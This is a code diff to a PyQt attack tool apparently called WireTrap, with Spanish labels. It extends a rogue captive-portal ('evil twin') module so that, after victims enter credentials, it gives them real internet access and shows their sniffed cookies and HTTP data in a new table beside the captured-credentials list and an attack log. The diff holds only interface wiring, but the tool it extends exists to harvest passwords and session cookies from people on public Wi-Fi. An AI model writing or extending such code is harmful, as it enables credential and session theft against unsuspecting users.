@@ -41,6 +41,7 @@ class SignalBridge(QObject):
     flood_stopped    = pyqtSignal()
     cp_log           = pyqtSignal(str)
     cp_credential    = pyqtSignal(object)   # dict
+    cp_sniff_data    = pyqtSignal(object)   # CapturedData post-login
     cp_started       = pyqtSignal()
     cp_stopped       = pyqtSignal()
 
@@ -89,6 +90,7 @@ class WireTrap(QMainWindow):
         self.bridge.flood_stopped.connect(self._on_flood_stopped)
         self.bridge.cp_log.connect(self._on_cp_log)
         self.bridge.cp_credential.connect(self._on_cp_credential)
+        self.bridge.cp_sniff_data.connect(self._on_cp_sniff_data)
         self.bridge.cp_started.connect(self._on_cp_started)
         self.bridge.cp_stopped.connect(self._on_cp_stopped)
 
@@ -298,6 +300,24 @@ class WireTrap(QMainWindow):
         self.cp_venue_input.setFont(QFont("Monospace", 10))
         opts_layout.addWidget(self.cp_venue_input)
 
+        sep2 = QFrame()
+        sep2.setFrameShape(QFrame.Shape.HLine)
+        sep2.setStyleSheet("color: #333;")
+        opts_layout.addWidget(sep2)
+
+        # Interfaz de salida (internet real)
+        out_label = QLabel("Interfaz internet (post-login):")
+        out_label.setFont(QFont("Monospace", 10))
+        opts_layout.addWidget(out_label)
+        self.cp_out_iface_combo = QComboBox()
+        self.cp_out_iface_combo.addItems(["eth0", "wlan0", "wlan1"])
+        self.cp_out_iface_combo.setFont(QFont("Monospace", 10))
+        opts_layout.addWidget(self.cp_out_iface_combo)
+        out_hint = QLabel("  Interfaz con acceso a internet real\n  que se da a la víctima tras el login")
+        out_hint.setFont(QFont("Monospace", 8))
+        out_hint.setStyleSheet("color: #888888;")
+        opts_layout.addWidget(out_hint)
+
         opts_layout.addStretch()
 
         # Info técnica
@@ -359,8 +379,28 @@ class WireTrap(QMainWindow):
         export_row.addWidget(self.btn_cp_export)
         creds_layout.addLayout(export_row)
 
-        creds_group.setFixedHeight(250)
+        creds_group.setFixedHeight(230)
         right_layout.addWidget(creds_group)
+
+        # Tabla de tráfico post-login (sniffer)
+        sniff_group = QGroupBox("TRÁFICO POST-LOGIN (COOKIES / HTTP)")
+        sniff_group.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
+        sniff_layout = QVBoxLayout(sniff_group)
+        self.cp_sniff_table = QTableWidget()
+        self.cp_sniff_table.setColumnCount(4)
+        self.cp_sniff_table.setHorizontalHeaderLabels(["Hora", "IP", "Tipo", "Valor"])
+        self.cp_sniff_table.horizontalHeader().setSectionResizeMode(
+            QHeaderView.ResizeMode.ResizeToContents)
+        self.cp_sniff_table.horizontalHeader().setStretchLastSection(True)
+        self.cp_sniff_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
+        self.cp_sniff_table.setFont(QFont("Monospace", 8))
+        self.cp_sniff_table.setStyleSheet(
+            "background: #0d0d0d; color: #00ff88; gridline-color: #222;"
+            "QHeaderView::section { background: #1a1a1a; color: #ff8800; }"
+        )
+        sniff_layout.addWidget(self.cp_sniff_table)
+        sniff_group.setFixedHeight(180)
+        right_layout.addWidget(sniff_group)
 
         # Log
         log_group = QGroupBox("LOG DEL ATAQUE")
@@ -443,6 +483,7 @@ class WireTrap(QMainWindow):
         self.cp_template_combo.setEnabled(False)
         self.cp_venue_input.setEnabled(False)
         self.cp_iface_combo.setEnabled(False)
+        self.cp_out_iface_combo.setEnabled(False)
 
     def _on_cp_stopped(self):
         self.cp_status_label.setText("● IDLE")
@@ -454,6 +495,7 @@ class WireTrap(QMainWindow):
         self.cp_template_combo.setEnabled(True)
         self.cp_venue_input.setEnabled(True)
         self.cp_iface_combo.setEnabled(True)
+        self.cp_out_iface_combo.setEnabled(True)
         self._cp_log("Portal detenido.")
 
     def _on_cp_start_clicked(self):
@@ -466,26 +508,42 @@ class WireTrap(QMainWindow):
         channel  = int(self.cp_channel_combo.currentText())
         template = self.cp_template_combo.currentText()
         venue    = self.cp_venue_input.text().strip() or "Portal WiFi"
+        out_if   = self.cp_out_iface_combo.currentText()
 
-        # Limpiar tabla de credenciales previa
+        # Limpiar tablas previas
         self.cp_creds_table.setRowCount(0)
         self.cp_lbl_count.setText("0 credenciales capturadas")
         self.btn_cp_export.setEnabled(False)
+        self.cp_sniff_table.setRowCount(0)
 
         self.captive_portal = CaptivePortal(iface)
         self.captive_portal.on_log        = lambda m: self.bridge.cp_log.emit(m)
         self.captive_portal.on_error      = lambda m: self.bridge.cp_log.emit(f"[!] ERROR: {m}")
         self.captive_portal.on_credential = lambda e: self.bridge.cp_credential.emit(e)
+        self.captive_portal.on_sniff_data = lambda d: self.bridge.cp_sniff_data.emit(d)
         self.captive_portal.on_started    = lambda: self.bridge.cp_started.emit()
         self.captive_portal.on_stopped    = lambda: self.bridge.cp_stopped.emit()
 
         import threading
         t = threading.Thread(
             target=self.captive_portal.start,
-            kwargs=dict(ssid=ssid, channel=channel, template=template, venue=venue),
+            kwargs=dict(ssid=ssid, channel=channel, template=template,
+                        venue=venue, out_interface=out_if),
             daemon=True
         )
         t.start()
+
+    def _on_cp_sniff_data(self, data):
+        from datetime import datetime
+        row = self.cp_sniff_table.rowCount()
+        self.cp_sniff_table.insertRow(row)
+        ts = datetime.now().strftime("%H:%M:%S")
+        values = [ts, data.source_ip, data.data_type, data.value[:120]]
+        for col, val in enumerate(values):
+            item = QTableWidgetItem(str(val))
+            item.setForeground(Qt.GlobalColor.green)
+            self.cp_sniff_table.setItem(row, col, item)
+        self.cp_sniff_table.scrollToBottom()
 
     def _on_cp_stop_clicked(self):
         if self.captive_portal:
